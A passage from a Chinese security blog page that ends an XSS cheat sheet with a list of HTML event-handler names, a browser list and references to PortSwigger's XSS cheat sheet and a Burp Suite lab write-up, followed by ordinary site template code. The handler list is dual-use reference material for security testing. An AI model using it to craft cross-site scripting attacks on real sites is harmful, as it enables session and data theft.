onseeking
onselect
onselectionchange
onselectstart
onshow
onsubmit
onsuspend
ontimeupdate
ontoggle
ontoggle(popover)
ontouchend
ontouchmove
ontouchstart
ontransitioncancel
ontransitionend
ontransitionrun
ontransitionstart
onunhandledrejection
onunload
onvolumechange
onwebkitanimationend
onwebkitanimationiteration
onwebkitanimationstart
onwebkitmouseforcechanged
onwebkitmouseforcedown
onwebkitmouseforceup
onwebkitmouseforcewillbegin
onwebkitplaybacktargetavailabilitychanged
onwebkittransitionend
onwebkitwillrevealbottom
onwheel
</code></pre>
<p>浏览器payload</p>
<pre class=" language-txt"><code class="language-txt">All browsers
Chrome
Firefox
Safari
</code></pre>
<p>参考:</p>
<p><a target="_blank" rel="noopener" href="https://portswigger.net/web-security/cross-site-scripting/cheat-sheet#oncanplay">跨站点脚本（XSS）备忘单</a></p>
<p><a target="_blank" rel="noopener" href="https://www.anquanke.com/post/id/245953#h3-74">burpsuite靶场系列之客户端漏洞篇)</a></p>

                
            </div>
            <hr/>

            

    <div class="reprint" id="reprint-statement">
        
            <div class="reprint__author">
                <span class="reprint-meta" style="font-weight: bold;">
                    <i class="fas fa-user">
                        文章作者:
                    </i>
                </span>
                <span class="reprint-info">
                    <a href="/about" rel="external nofollow noreferrer">读序</a>
                </span>
            </div>
            <div class="reprint__type">
                <span class="reprint-meta" style="font-weight: bold;">
                    <i class="fas fa-link">
                        文章链接:
                    </i>
                </span>
                <span class="reprint-info">
                    <a href="https://bigworldxld.github.io/2024/09/21/19154.html">https://bigworldxld.github.io/2024/09/21/19154.html</a>
                </span>
            </div>
            <div class="reprint__notice">
                <span class="reprint-meta" style="font-weight: bold;">
                    <i class="fas fa-copyright">
                        版权声明:
                    </i>
                </span>
                <span class="reprint-info">
                    本博客所有文章除特別声明外，均采用
                    <a href="https://creativecommons.org/licenses/by/4.0/deed.zh" rel="external nofollow noreferrer" target="_blank">CC BY 4.0</a>
                    许可协议。转载请注明来源
                    <a href="/about" target="_blank">读序</a>
                    !
                </span>
            </div>
        
    </div>

    <script async defer>
      document.addEventListener("copy", function (e) {
        let toastHTML = '<span>复制成功，请遵循本文的转载规则</span><button class="btn-flat toast-action" onclick="navToReprintStatement()" style="font-size: smaller">查看</a>';
        M.toast({html: toastHTML})
      });

      function navToReprintStatement() {
        $("html, body").animate({scrollTop: $("#reprint-statement").offset().top - 80}, 800);
      }
    </script>



            <div class="tag_share" style="display: block;">
                <div class="post-meta__tag-list" style="display: inline-block;">
                    
                        <div class="article-tag">
                            
                                <a href="/tags/js/">
                                    <span class="chip bg-color">js</span>
                                </a>
                            
                                <a href="/tags/html/">
                                    <span class="chip bg-color">html</span>
                                </a>
                            
                                <a href="/tags/csrf/">
                                    <span class="chip bg-color">csrf</span>
                                </a>
                            
                                <a href="/tags/csp/">
                                    <span class="chip bg-color">csp</span>
                                </a>
                            
                        </div>
                    
                </div>
                <div class="post_share" style="zoom: 80%; width: fit-content; display: inline-block; float: right; margin: -0.15rem 0;">
                    <link rel="stylesheet" type="text/css" href="/libs/share/css/share.min.css">
<div id="article-share">

    
    <div class="social-share" data-sites="twitter,facebook,google,qq,qzone,wechat,weibo,douban,linkedin" data-wechat-qrcode-helper="<p>微信扫一扫即可分享！</p>"></div>
    <script src="/libs/share/js/social-share.min.js"></script>
    

    

</div>

                </div>
            </div>
            
                <style>
    #reward {
        margin: 40px 0;
        text-align: center;
    }

    #reward .reward-link {
        font-size: 1.4rem;
        line-height: 38px;
    }

    #reward .btn-floating:hover {
        box-shadow: 0 6px 12px rgba(0, 0, 0, 0.2), 0 5px 15px rgba(0, 0, 0, 0.2);
    }

    #rewardModal {
        width: 320px;
        height: 350px;
    }

    #rewardModal .reward-title {
        margin: 15px auto;
        padding-bottom: 5px;
    }

    #rewardModal .modal-content {
        padding: 10px;
    }

    #rewardModal .close {
        position: absolute;
        right: 15px;
        top: 15px;
        color: rgba(0, 0, 0, 0.5);
        font-size: 1.3rem;
        line-height: 20px;
        cursor: pointer;
    }

    #rewardModal .close:hover {
        color: #ef5350;
        transform: scale(1.3);
        -moz-transform:scale(1.3);
        -webkit-transform:scale(1.3);
        -o-transform:scale(1.3);
    }

    #rewardModal .reward-tabs {
        margin: 0 auto;
        width: 210px;
    }

    .reward-tabs .tabs {
        height: 38px;
        margin: 10px auto;
        padding-left: 0;
    }

    .reward-content ul {
        padding-left: 0 !important;
    }

    .reward-tabs .tabs .tab {
        height: 38px;
        line-height: 38px;
    }

    .reward-tabs .tab a {
        color: #fff;
        background-color: #ccc;
    }

    .reward-tabs .tab a:hover {
        background-color: #ccc;
        color: #fff;
    }

    .reward-tabs .wechat-tab .active {
        color: #fff !important;
        background-color: #22AB38 !important;
    }

    .reward-tabs .alipay-tab .active {
        color: #fff !important;
        background-color: #019FE8 !important;
    }

    .reward-tabs .reward-img {
        width: 210px;
        height: 210px;
    }
</style>

<div id="reward">
    <a href="#rewardModal" class="reward-link modal-trigger btn-floating btn-medium waves-effect waves-light red">赏</a>

    <!-- Modal Structure -->
    <div id="rewardModal" class="modal">
        <div class="modal-content">
            <a class="close modal-close"><i class="fas fa-times"></i></a>
            <h4 class="reward-title">你的赏识是我前进的动力</h4>
            <div class="reward-content">
                <div class="reward-tabs">
                    <ul class="tabs row">
                        <li class="tab col s6 alipay-tab waves-effect waves-light"><a href="#alipay">支付宝</a></li>
                        <li class="tab col s6 wechat-tab waves-effect waves-light"><a href="#wechat">微 信</a></li>
                    </ul>
                    <div id="alipay">
                        <img src="/medias/reward/alipay.jpg" class="reward-img" alt="支付宝打赏二维码">
                    </div>
                    <div id="wechat">
                        <img src="/medias/reward/wechat.png" class="reward-img" alt="微信打赏二维码">
                    </div>
                </div>
            </div>
        </div>
    </div>
</div>

<script>
    $(function () {
        $('.tabs').tabs();
    });
</script>

            
        </div>
    </div>

    

    

    

    

    

    

    

    

    

    

<article id="prenext-posts" class="prev-next articles">
    <div class="row article-row">
        
        <div class="article col s12 m6" data-aos="fade-up">
            <div class="article-badge left-badge text-color">
                <i class="fas fa-chevron-left"></i>&nbsp;上一篇</div>
            <div class="card">
                <a href="/2024/10/09/43829.html">
                    <div class="card-image">
                        
                        <img src="https://bigworldxld.github.io/picx-images-hosting/images/wireshark.webp" class="responsive-img" alt="wireshark使用">
                        
                        <span class="card-title">wireshark使用</span>
                    </div>
                </a>
                <div class="card-content article-content">
                    <div class="summary block-with-text">
                        
                            
                        
                    </div>
                    <div class="publish-info">
                        <span class="publish-date">
                            <i class="far fa-clock fa-fw icon-date"></i>2024-10-09
                        </span>
                        <span class="publish-author">
                            
                            <i class="fas fa-bookmark fa-fw icon-category"></i>
                            
                            <a href="/categories/tools/" class="post-category">
                                    tools
                                </a>
                            
                            
                        </span>
                    </div>
                </div>
                
                <div class="card-action article-tags">
                    
                    <a href="/tags/wireshark/">
                        <span class="chip bg-color">wireshark</span>
                    </a>
                    
                    <a href="/tags/ISO/">
                        <span class="chip bg-color">ISO</span>
                    </a>
                    
                </div>
                
            </div>
        </div>
        
        
        <div class="article col s12 m6" data-aos="fade-up">
            <div class="article-badge right-badge text-color">
                下一篇&nbsp;<i class="fas fa-chevron-right"></i>
            </div>
            <div class="card">
                <a href="/2024/09/14/17654.html">
                    <div class="card-image">
                        
                        <img src="/images/mysql%E6%8A%80%E5%B7%A7.jpg" class="responsive-img" alt="sql备忘表">
                        
                        <span class="card-title">sql备忘表</span>
                    </div>
                </a>
                <div class="card-content article-content">
                    <div class="summary block-with-text">
                        
                            
                        
                    </div>
                    <div class="publish-info">
                            <span class="publish-date">
                                <i class="far fa-clock fa-fw icon-date"></i>2024-09-14
                            </span>
                        <span class="publish-author">
                            
                            <i class="fas fa-bookmark fa-fw icon-category"></i>
                            
                            <a href="/categories/database/" class="post-category">
                                    database
                                </a>
                            
                            
                        </span>
                    </div>
                </div>
                
                <div class="card-action article-tags">
                    
                    <a href="/tags/SQL/">
                        <span class="chip bg-color">SQL</span>
                    </a>
                    
                    <a href="/tags/pgsql/">
                        <span class="chip bg-color">pgsql</span>
                    </a>
                    
                    <a href="/tags/mysql/">
                        <span class="chip bg-color">mysql</span>
                    </a>
                    
                    <a href="/tags/oracle/">
                        <span class="chip bg-color">oracle</span>
                    </a>
                    
                    <a href="/tags/Microsoft/">
                        <span class="chip bg-color">Microsoft</span>
                    </a>
                    
                </div>
                
            </div>
        </div>
        
    </div>
</article>

</div>



<!-- 代码块功能依赖 -->
<script type="text/javascript" src="/libs/codeBlock/codeBlockFuction.js"></script>

<!-- 代码语言 -->

<script type="text/javascript" src="/libs/codeBlock/codeLang.js"></script>


<!-- 代码块复制 -->

<script type="text/javascript" src="/libs/codeBlock/codeCopy.js"></script>


<!-- 代码块收缩 -->

<script type="text/javascript" src="/libs/codeBlock/codeShrink.js"></script>


    </div>
    <div id="toc-aside" class="expanded col l3 hide-on-med-and-down">
        <div class="toc-widget card" style="background-color: white;">
            <div class="toc-title"><i class="far fa-list-alt"></i>&nbsp;&nbsp;目录</div>
            <div id="toc-content"></div>
        </div>
    </div>
</div>

<!-- TOC 悬浮按钮. -->

<div id="floating-toc-btn" class="hide-on-med-and-down">
    <a class="btn-floating btn-large bg-color">
        <i class="fas fa-list-ul"></i>
    </a>
</div>


<script src="/libs/tocbot/tocbot.min.js"></script>
<script>
    $(function () {
        tocbot.init({
            tocSelector: '#toc-content',
            contentSelector: '#articleContent',
            headingsOffset: -($(window).height() * 0.4 - 45),
            collapseDepth: Number('0'),
            headingSelector: 'h2, h3, h4'
        });

        // modify the toc link href to support Chinese.
        let i = 0;
        let tocHeading = 'toc-heading-';
        $('#toc-content a').each(function () {
            $(this).attr('href', '#' + tocHeading + (++i));
        });

        // modify the heading title id to support Chinese.
        i = 0;
        $('#articleContent').children('h2, h3, h4').each(function () {
            $(this).attr('id', tocHeading + (++i));
        });

        // Set scroll toc fixed.
        let tocHeight = parseInt($(window).height() * 0.4 - 64);
        let $tocWidget = $('.toc-widget');
        $(window).scroll(function () {
            let scroll = $(window).scrollTop();
            /* add post toc fixed. */
            if (scroll > tocHeight) {
                $tocWidget.addClass('toc-fixed');
            } else {
                $tocWidget.removeClass('toc-fixed');
            }
        });

        
        /* 修复文章卡片 div 的宽度. */
        let fixPostCardWidth = function (srcId, targetId) {
            let srcDiv = $('#' + srcId);
            if (srcDiv.length === 0) {
                return;
            }

            let w = srcDiv.width();
            if (w >= 450) {
                w = w + 21;
            } else if (w >= 350 && w < 450) {
                w = w + 18;
            } else if (w >= 300 && w < 350) {
                w = w + 16;
            } else {
                w = w + 14;
            }
            $('#' + targetId).width(w);
        };

        // 切换TOC目录展开收缩的相关操作.
        const expandedClass = 'expanded';
        let $tocAside = $('#toc-aside');
        let $mainContent = $('#main-content');
        $('#floating-toc-btn .btn-floating').click(function () {
            if ($tocAside.hasClass(expandedClass)) {
                $tocAside.removeClass(expandedClass).hide();
                $mainContent.removeClass('l9');
            } else {
                $tocAside.addClass(expandedClass).show();
                $mainContent.addClass('l9');
            }
            fixPostCardWidth('artDetail', 'prenext-posts');
        });
        
    });
</script>

    

</main>




    <footer class="page-footer bg-color">
    

    <div class="container row center-align"
         style="margin-bottom: 15px !important;">
        <div class="col s12 m8 l8 copy-right">
            Copyright&nbsp;&copy;
            
                <span id="year">2021-2025</span>
            
            <a href="/about" target="_blank">读序</a>
            |&nbsp;Author&nbsp;<a href="https://bigworldxld.github.io/" target="_blank">bigworldxld</a>
            |&nbsp;Dailylife&nbsp;<a href="https://bigworldxld.github.io/duxu-dailylife/" target="_blank">blog</a>
			|&nbsp;Desktop&nbsp;<a href="https://bigworldxld.github.io/desktop/" target="_blank">desktop</a>
            <br>
			
            
            
            
                
            
           
			      
				<span id="busuanzi_container_site_pv" style='display:none'></span>
				<i class="fa fa-heart-o"></i>
			本站总访问量 <span id="busuanzi_value_site_pv" class="white-color"></span>

			

			
				<span id="busuanzi_container_site_uv" style='display:none'></span>
					人次,&nbsp;访客数 <span id="busuanzi_value_site_uv" class="white-color"></span> 人.

			

			
            <br>
		


            <!-- 运行天数提醒. -->
            
                <span id="sitetime"> Loading ...</span>
                <script>
                    var calcSiteTime = function () {
                        var seconds = 1000;
                        var minutes = seconds * 60;
                        var hours = minutes * 60;
                        var days = hours * 24;
                        var years = days * 365;
                        var today = new Date();
                        var startYear = "2021";
                        var startMonth = "12";
                        var startDate = "30";
                        var startHour = "0";
                        var startMinute = "0";
                        var startSecond = "0";
                        var todayYear = today.getFullYear();
                        var todayMonth = today.getMonth() + 1;
                        var todayDate = today.getDate();
                        var todayHour = today.getHours();
                        var todayMinute = today.getMinutes();
                        var todaySecond = today.getSeconds();
                        var t1 = Date.UTC(startYear, startMonth, startDate, startHour, startMinute, startSecond);
                        var t2 = Date.UTC(todayYear, todayMonth, todayDate, todayHour, todayMinute, todaySecond);
                        var diff = t2 - t1;
                        var diffYears = Math.floor(diff / years);
                        var diffDays = Math.floor((diff / days) - diffYears * 365);

                        // 区分是否有年份.
                        var language = 'zh-CN';
                        if (startYear === String(todayYear)) {
                            document.getElementById("year").innerHTML = todayYear;
                            var daysTip = 'This site has been running for ' + diffDays + ' days';
                            if (language === 'zh-CN') {
                                daysTip = '本站已运行 ' + diffDays + ' 天';
                            } else if (language === 'zh-HK') {
                                daysTip = '本站已運行 ' + diffDays + ' 天';
                            }
                            document.getElementById("sitetime").innerHTML = daysTip;
                        } else {
                            document.getElementById("year").innerHTML = startYear + " - " + todayYear;
                            var yearsAndDaysTip = 'This site has been running for ' + diffYears + ' years and '
                                + diffDays + ' days';
                            if (language === 'zh-CN') {
                                yearsAndDaysTip = '本站已运行 ' + diffYears + ' 年 ' + diffDays + ' 天';
                            } else if (language === 'zh-HK') {
                                yearsAndDaysTip = '本站已運行 ' + diffYears + ' 年 ' + diffDays + ' 天';
                            }
                            document.getElementById("sitetime").innerHTML = yearsAndDaysTip;
                        }
                    }

                    calcSiteTime();
                </script>
            
            <br>
            
        </div>
        <div class="col s12 m4 l4 social-link social-statis">

    <a href="https://github.com/bigworldxld/bigworldxld.github.io" class="tooltipped" target="_blank" data-tooltip="访问我的GitHub" data-position="top" data-delay="50">
        <i class="fab fa-github"></i>
    </a>



    <a href="mailto:2117376396@qq.com" class="tooltipped" target="_blank" data-tooltip="邮件联系我" data-position="top" data-delay="50">
        <i class="fas fa-envelope-open"></i>
    </a>







    <a href="tencent://AddContact/?fromId=50&fromSubId=1&subcmd=all&uin=2117376396" class="tooltipped" target="_blank" data-tooltip="QQ联系我: 2117376396" data-position="top" data-delay="50">
        <i class="fab fa-qq"></i>
    </a>







    <a href="/atom.xml" class="tooltipped" target="_blank" data-tooltip="RSS 订阅" data-position="top" data-delay="50">
        <i class="fas fa-rss"></i>
    </a>

</div>
    </div>
</footer>
<div class="progress-bar"></div>
<span id="sitetime"></span>
<script language = javascript >
    function siteTime() {
        window.setTimeout("siteTime()", 1000);
		let time = new Date().toLocaleString();
        var seconds = 1000;
        var minutes = seconds * 60;
        var hours = minutes * 60;
        var days = hours * 24;
        var years = days * 365;
        var today = new Date();
        var todayYear = today.getFullYear();
        var todayMonth = today.getMonth() + 1;
        var todayDate = today.getDate();
        var todayHour = today.getHours();
        var todayMinute = today.getMinutes();
        var todaySecond = today.getSeconds();
        var t1 = Date.UTC(2021, 12, 30, 00, 00, 00); //北京时间2018-2-13 00:00:00 
        var t2 = Date.UTC(todayYear, todayMonth, todayDate, todayHour, todayMinute, todaySecond); 
        var diff = t2 - t1; var diffYears = Math.floor(diff / years); 
        var diffDays = Math.floor((diff / days) - diffYears * 365); 
        var diffHours = Math.floor((diff - (diffYears * 365 + diffDays) * days) / hours); 
        var diffMinutes = Math.floor((diff - (diffYears * 365 + diffDays) * days - diffHours * hours) / minutes); 
        var diffSeconds = Math.floor((diff - (diffYears * 365 + diffDays) * days - diffHours * hours - diffMinutes * minutes) / seconds); 
		document.getElementById("sitetime").innerHTML = "当前时间为"+ time +"<br/>本站已运行 " +diffYears+" 年 "+diffDays + " 天 " + diffHours + " 小时 " + diffMinutes + " 分钟 " + diffSeconds + " 秒"; 
    } 
    siteTime(); 
</script>


    <!-- 搜索遮罩框 -->
<div id="searchModal" class="modal">
    <div class="modal-content">
        <div class="search-header">
            <span class="title"><i class="fas fa-search"></i>&nbsp;&nbsp;搜索</span>
            <input type="search" id="searchInput" name="s" placeholder="请输入搜索的关键字"
                   class="search-input">
        </div>
        <div id="searchResult"></div>
    </div>
</div>

<script type="text/javascript">
$(function () {
    var searchFunc = function (path, search_id, content_id) {
        'use strict';
        $.ajax({
            url: path,
            dataType: "xml",
            success: function (xmlResponse) {
                // get the contents from search data
                var datas = $("entry", xmlResponse).map(function () {
                    return {
                        title: $("title", this).text(),
                        content: $("content", this).text(),
                        url: $("url", this).text()
                    };
                }).get();
                var $input = document.getElementById(search_id);
                var $resultContent = document.getElementById(content_id);
                $input.addEventListener('input', function () {
                    var str = '<ul class=\"search-result-list\">';
                    var keywords = this.value.trim().toLowerCase().split(/[\s\-]+/);
                    $resultContent.innerHTML = "";
                    if (this.value.trim().length <= 0) {
                        return;
                    }
                    // perform local searching
                    datas.forEach(function (data) {
                        var isMatch = true;
                        var data_title = data.title.trim().toLowerCase();
                        var data_content = data.content.trim().replace(/<[^>]+>/g, "").toLowerCase();
                        var data_url = data.url;
                        data_url = data_url.indexOf('/') === 0 ? data.url : '/' + data_url;
                        var index_title = -1;
                        var index_content = -1;
                        var first_occur = -1;
                        // only match artiles with not empty titles and contents
                        if (data_title !== '' && data_content !== '') {
                            keywords.forEach(function (keyword, i) {
                                index_title = data_title.indexOf(keyword);
                                index_content = data_content.indexOf(keyword);
                                if (index_title < 0 && index_content < 0) {
                                    isMatch = false;
                                } else {
                                    if (index_content < 0) {
                                        index_content = 0;
                                    }
                                    if (i === 0) {
                                        first_occur = index_content;
                                    }
                                }
                            });
                        }
                        // show search results
                        if (isMatch) {
                            str += "<li><a href='" + data_url + "' class='search-result-title'>" + data_title + "</a>";
                            var content = data.content.trim().replace(/<[^>]+>/g, "");
                            if (first_occur >= 0) {
                                // cut out 100 characters
                                var start = first_occur - 20;
                                var end = first_occur + 80;
                                if (start < 0) {
                                    start = 0;
                                }
                                if (start === 0) {
                                    end = 100;
                                }
                                if (end > content.length) {
                                    end = content.length;
                                }
                                var match_content = content.substr(start, end);
                                // highlight all keywords
                                keywords.forEach(function (keyword) {
                                    var regS = new RegExp(keyword, "gi");
                                    match_content = match_content.replace(regS, "<em class=\"search-keyword\">" + keyword + "</em>");
                                });

                                str += "<p class=\"search-result\">" + match_content + "...</p>"
                            }
                            str += "</li>";
                        }
                    });
                    str += "</ul>";
                    $resultContent.innerHTML = str;
                });
            }
        });
    };

    searchFunc('/search.xml', 'searchInput', 'searchResult');
});
</script>

    <!-- 回到顶部按钮 -->
<div id="backTop" class="top-scroll">
    <a class="btn-floating btn-large waves-effect waves-light" href="#!">
        <i class="fas fa-arrow-up"></i>
    </a>
</div>


    <script src="/libs/materialize/materialize.min.js"></script>
    <script src="/libs/masonry/masonry.pkgd.min.js"></script>
    <script src="/libs/aos/aos.js"></script>
    <script src="/libs/scrollprogress/scrollProgress.min.js"></script>
    <script src="/libs/lightGallery/js/lightgallery-all.min.js"></script>
    <script src="/js/matery.js"></script>

    

    

    <!-- 雪花特效 -->
    

    <!-- 鼠标星星特效 -->
     
        <script type="text/javascript">
            // 只在桌面版网页启用特效
            var windowWidth = $(window).width();
            if (windowWidth > 768) {
                document.write('<script type="text/javascript" src="/libs/others/star.js"><\/script>');
            }
        </script>
    

     
        <script src="https://ssl.captcha.qq.com/TCaptcha.js"></script>
        <script src="/libs/others/TencentCaptcha.js"></script>
        <button id="TencentCaptcha" data-appid="xxxxxxxxxx" data-cbfn="callback" type="button" hidden></button>
    

    <!-- Baidu Analytics -->

    <!-- Baidu Push -->

<script>
    (function () {
        var bp = document.createElement('script');
        var curProtocol = window.location.protocol.split(':')[0];
        if (curProtocol === 'https') {
            bp.src = 'https://zz.bdstatic.com/linksubmit/push.js';
        } else {
            bp.src = 'http://push.zhanzhang.baidu.com/push.js';
        }
        var s = document.getElementsByTagName("script")[0];
        s.parentNode.insertBefore(bp, s);
    })();
</script>

    
    <script src="/libs/others/clicklove.js" async="async"></script>
    
    
    <script async src="/libs/others/busuanzi.pure.mini.js"></script>
    

    

    

    <!--腾讯兔小巢-->
    
    

    

    

    
    <script src="/libs/instantpage/instantpage.js" type="module"></script>
    

<script type="text/javascript">
    var OriginTitile = document.title,
        st;
    document.addEventListener("visibilitychange", function () {
        document.hidden ? (document.title = "๑•̀ㅂ•́) ✧看不见～看不见～", clearTimeout(st)) : (document.title =
            "(๑•̀ㅂ•́) ✧看见～", st = setTimeout(function () {
                document.title = OriginTitile
            }, 3e3))
    })
</script>

</body>

</html>
